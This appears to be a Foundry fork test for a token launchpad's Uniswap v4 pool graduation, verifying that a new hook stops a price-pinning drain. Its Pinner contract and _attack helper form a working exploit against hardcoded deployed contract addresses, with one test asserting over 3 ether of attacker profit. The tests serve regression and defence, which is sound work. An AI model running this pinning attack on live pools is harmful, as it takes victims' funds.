// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {Gauge} from "../../src/Gauge.sol";
import {GraduationHook} from "../../src/GraduationHook.sol";
import {Launchpad} from "../../src/Launchpad.sol";
import {LaunchSwapRouter} from "../../src/LaunchSwapRouter.sol";
import {LaunchpadToken} from "../../src/LaunchpadToken.sol";

interface IV4Quoter {
    struct QuoteExactSingleParams {
        PoolKey poolKey;
        bool zeroForOne;
        uint128 exactAmount;
        bytes hookData;
    }

    function quoteExactInputSingle(QuoteExactSingleParams memory params)
        external
        returns (uint256 amountOut, uint256 gasEstimate);
}

contract Pinner is IUnlockCallback {
    IPoolManager immutable manager;

    constructor(IPoolManager _manager) {
        manager = _manager;
    }

    function pin(PoolKey memory key, uint160 limit) external {
        manager.unlock(abi.encode(key, limit));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        (PoolKey memory key, uint160 limit) = abi.decode(data, (PoolKey, uint160));
        manager.swap(key, SwapParams({zeroForOne: true, amountSpecified: -1, sqrtPriceLimitX96: limit}), "");
        return "";
    }
}

contract GraduationHookForkTest is Test {
    using StateLibrary for IPoolManager;

    Launchpad constant LAUNCHPAD = Launchpad(payable(0xf87eA45bdEd500421BDAEE5bf340dfc27B3d19c7));
    LaunchSwapRouter constant ROUTER = LaunchSwapRouter(payable(0x519226C8935Ff79D958d6f821d5F5B74987Dc8C3));
    address constant QUOTER_ROBINHOOD = 0xe202BB8dd524eE9C5E679e5B5809f7A373a982Ef;
    Gauge constant PREVIOUS = Gauge(payable(0x45055be2B0b44e200E9CaBfBDA85d43F648d1a59));

    address creator = makeAddr("hook-creator");
    address victim = makeAddr("hook-victim");
    address attacker = makeAddr("hook-attacker");
    address whale = makeAddr("hook-whale");

    Gauge live;
    IPoolManager manager;

    function setUp() public {
        string memory rpc = vm.envOr("FORK_RPC", string(""));
        if (bytes(rpc).length == 0) vm.skip(true);
        vm.createSelectFork(rpc);
        live = Gauge(payable(LAUNCHPAD.gaugeImplementation()));
        manager = PREVIOUS.poolManager();
        vm.deal(creator, 1 ether);
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);
        vm.deal(whale, 100 ether);
    }

    function test_thePreviousGaugeCanBeDrained() public {
        vm.prank(LAUNCHPAD.owner());
        LAUNCHPAD.setGaugeImplementation(address(PREVIOUS));
        (LaunchpadToken token, Gauge gauge) = _launch("Drain Rehearsal", "DRAIN");
        uint256 profit = _attack(token, gauge, false);
        console2.log("previous gauge: attacker profit (wei)", profit);
        assertGt(profit, 3 ether);
    }

    function test_theLaunchpadAsItStandsRefusesThePin() public {
        if (address(live) == address(PREVIOUS)) vm.skip(true);
        (LaunchpadToken token, Gauge gauge) = _launch("Live Rehearsal", "LIVE");
        assertTrue(address(gauge.poolKey().hooks) != address(0));
        uint256 profit = _attack(token, gauge, true);
        console2.log("launchpad as it stands: attacker gain (wei)", profit);
        assertLt(profit, 0.02 ether);
    }

    function test_theNewGaugeStopsTheDrain() public {
        (GraduationHook hook, Gauge fixedGauge) = _attachFix();
        (LaunchpadToken token, Gauge gauge) = _launch("Hook Rehearsal", "HOOK");
        assertEq(address(gauge).code, abi.encodePacked(hex"363d3d373d3d3d363d73", address(fixedGauge), hex"5af43d82803e903d91602b57fd5bf3"));
        assertEq(address(gauge.poolKey().hooks), address(hook));
        assertEq(hook.gaugeOf(gauge.poolId()), address(gauge));

        uint256 profit = _attack(token, gauge, true);
        console2.log("new gauge: attacker gain (wei)", profit);
        assertLt(profit, 0.02 ether);
    }

    function test_aGraduatedTokenTradesThroughTheLiveRouterAndQuoter() public {
        _attachFix();
        (LaunchpadToken token, Gauge gauge) = _launch("Trade Rehearsal", "TRADE");
        vm.prank(whale);
        LAUNCHPAD.buyExactEth{value: 10 ether}(address(token), 0);
        assertTrue(gauge.graduated());
        (uint160 opened,,,) = manager.getSlot0(gauge.poolId());
        assertEq(opened, gauge.initialSqrtPriceX96());

        PoolKey memory key = gauge.poolKey();
        if (block.chainid == 4663) {
            (uint256 quoted,) = IV4Quoter(QUOTER_ROBINHOOD).quoteExactInputSingle(
                IV4Quoter.QuoteExactSingleParams({poolKey: key, zeroForOne: true, exactAmount: 0.1 ether, hookData: ""})
            );
            assertGt(quoted, 0);
        }

        uint256 before = token.balanceOf(victim);
        vm.prank(victim);
        uint256 got = ROUTER.swapExactIn{value: 0.1 ether}(key, true, 0.1 ether, 1, victim, block.timestamp);
        assertEq(token.balanceOf(victim) - before, got);
        assertGt(got, 0);

        uint256 ethBefore = victim.balance;
        vm.startPrank(victim);
        token.approve(address(ROUTER), got);
        uint256 back = ROUTER.swapExactIn(key, false, got, 1, victim, block.timestamp);
        vm.stopPrank();
        assertEq(victim.balance - ethBefore, back);
        assertGt(back, 0.09 ether);
    }

    function test_noOneCanOpenTheNextTokensPoolFirst() public {
        (GraduationHook hook,) = _attachFix();
        address next = vm.computeCreateAddress(address(LAUNCHPAD), vm.getNonce(address(LAUNCHPAD)));
        PoolKey memory early = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(next),
            fee: 10_000,
            tickSpacing: 200,
            hooks: IHooks(address(hook))
        });
        vm.prank(attacker);
        vm.expectRevert();
        manager.initialize(early, TickMath.getSqrtPriceAtTick(0));

        (LaunchpadToken token,) = _launch("Squat Rehearsal", "SQUAT");
        assertEq(address(token), next);
    }

    function test_everyLaunchKeepsTheGaugeItWasMadeWith() public {
        uint256 count = LAUNCHPAD.getTokensCount();
        address[] memory existing = count == 0 ? new address[](0) : LAUNCHPAD.getTokens(0, count - 1);
        (GraduationHook hook, Gauge fixedGauge) = _attachFix();
        for (uint256 i; i < existing.length; i++) {
            Gauge gauge = Gauge(payable(LAUNCHPAD.tokenToGauge(existing[i])));
            bool earlier = keccak256(address(gauge).code)
                == keccak256(abi.encodePacked(hex"363d3d373d3d3d363d73", address(PREVIOUS), hex"5af43d82803e903d91602b57fd5bf3"));
            if (!earlier) {
                assertEq(address(gauge).code, abi.encodePacked(hex"363d3d373d3d3d363d73", address(fixedGauge), hex"5af43d82803e903d91602b57fd5bf3"));
            }
            assertEq(address(gauge.poolKey().hooks), earlier ? address(0) : address(hook));
        }
    }

    function _attachFix() internal returns (GraduationHook hook, Gauge fixedGauge) {
        address deployedHook = vm.envOr("GRADUATION_HOOK", address(0));
        address deployedGauge = vm.envOr("GAUGE_IMPLEMENTATION", address(0));
        if (deployedHook != address(0) && deployedGauge != address(0)) {
            hook = GraduationHook(deployedHook);
            fixedGauge = Gauge(payable(deployedGauge));
        } else {
            address at = address((uint160(uint256(keccak256("creora graduation hook fork"))) & ~uint160(0x3FFF)) | uint160(0x2880));
            deployCodeTo("GraduationHook.sol:GraduationHook", abi.encode(address(manager), address(LAUNCHPAD)), at);
            hook = GraduationHook(at);
            fixedGauge = Gauge(
                payable(
                    deployCode(
                        "Gauge.sol:Gauge",
                        abi.encode(
                            address(PREVIOUS.referralHandler()),
                            address(PREVIOUS.poolManager()),
                            address(PREVIOUS.positionManager()),
                            address(PREVIOUS.permit2()),
                            address(hook)
                        )
                    )
                )
            );
        }
        assertEq(address(fixedGauge.referralHandler()), address(PREVIOUS.referralHandler()));
        assertEq(address(fixedGauge.poolManager()), address(PREVIOUS.poolManager()));
        assertEq(address(fixedGauge.positionManager()), address(PREVIOUS.positionManager()));
        assertEq(address(fixedGauge.permit2()), address(PREVIOUS.permit2()));
        assertEq(address(fixedGauge.poolHook()), address(hook));
        assertEq(address(hook.poolManager()), address(manager));
        assertEq(address(hook.launchpad()), address(LAUNCHPAD));
        vm.prank(LAUNCHPAD.owner());
        LAUNCHPAD.setGaugeImplementation(address(fixedGauge));
    }

    function _launch(string memory name, string memory symbol) internal returns (LaunchpadToken token, Gauge gauge) {
        uint256 cost = LAUNCHPAD.creationCost();
        vm.prank(creator);
        (token, gauge) = LAUNCHPAD.createLaunchpadToken{value: cost}(
            LaunchpadToken.TokenConfig({name: name, symbol: symbol}),
            LaunchpadToken.TokenMetadataConfig({ipfsHash: "", website: "", twitter: "", telegram: "", description: "", metadata: ""}),
            Launchpad.AutoSnipeConfig({minAmountOut: 0})
        );
    }

    function _attack(LaunchpadToken token, Gauge gauge, bool expectPinRefused) internal returns (uint256 gain) {
        vm.prank(victim);
        LAUNCHPAD.buyExactEth{value: 3 ether}(address(token), 0);
        uint256 start = attacker.balance;
        vm.prank(attacker);
        LAUNCHPAD.buyExactEth{value: 0.01 ether}(address(token), 0);
        uint256 bag = token.balanceOf(attacker);

        PoolKey memory key = gauge.poolKey();
        (uint160 initial,,,) = manager.getSlot0(gauge.poolId());
        Pinner pinner = new Pinner(manager);
        if (expectPinRefused) vm.expectRevert();
        pinner.pin(key, initial / 1_000_000);

        vm.prank(whale);
        LAUNCHPAD.buyExactEth{value: 10 ether}(address(token), 0);
        assertTrue(gauge.graduated());

        vm.startPrank(attacker);
        token.approve(address(ROUTER), bag);
        ROUTER.swapExactIn(key, false, bag, 0, attacker, block.timestamp);
        vm.stopPrank();
        gain = attacker.balance > start ? attacker.balance - start : 0;
    }
}
